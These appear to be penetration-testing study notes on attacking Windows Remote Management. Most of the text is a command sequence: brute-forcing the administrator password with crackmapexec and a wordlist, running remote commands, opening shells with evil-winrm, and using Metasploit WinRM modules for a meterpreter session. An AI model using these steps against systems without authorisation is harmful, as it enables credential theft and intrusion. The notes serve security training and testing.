WinRM is typically used in the following ways:
Remotely access and interact with Windows hosts on a local network
Remotely access and execute commands on Windows systems
Manage and configure Windows systems remotely
WinRM typically uses TCP port 5985 and 5986 (HTTPS)

WinRM implements access control and security for communication between systems through various forms of auth

We can utilize a utility called 'crackmapexec' to perform a brute-force on WinRM in order to identify users 
and their passwords as well as execute commands on the target system

We can also utilize a ruby script called 'evil-winrm' to obtain a command shell session on the target system

--------------------------------Exploitation-----------------------------------------------------------------------------------------------

nmap -sV <ip> (only scans the top 1000, you will need to scan 5985, 5986 directly)

nmap -sV -p 5985 <ip>
** dont pay attention to the banner, you will ignore this it is usually inaccurate in identifying the service **

crackmapexec winrm <ip> -u administrator (or you can use a wordlist) -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
** we are specifically targeting 'administrator' because this is the first account auto created on a windows machine, and it is full access **
** this will get you the creds **

crackmapexec winrm <ip> -u administrator -p <cracked password> -x "whoami" (or) "systeminfo"
** this is an example of executing a command remotely now that you have brute-forced the credentials **

evil-winrm.rb -u administrator -p 'password' -i <ip> (this will provide a command shell session)
whoami (or) ipconfig (or) net user 
service postgresql start && msfconsole
search winrm_script
use
(ensure its x86 or x64 payload depending on target system)
set FORCE_VBS true, specify username and password
exploit

auxiliary/scanner/winrm/winrm_auth_methods (checks if exploitable)
                       /winrm_cmd (runs commands such as whoami using credentials found in login module or any other methods)
                       /winrm_login (brute login, ensure web winrm directory is correct in options)
                       /winrm_wql
exploit/windows/winrm/winrm_script_exec (can be used for a meterpreter session using credentials, set FORCE_VBS to true if you get an error without it)
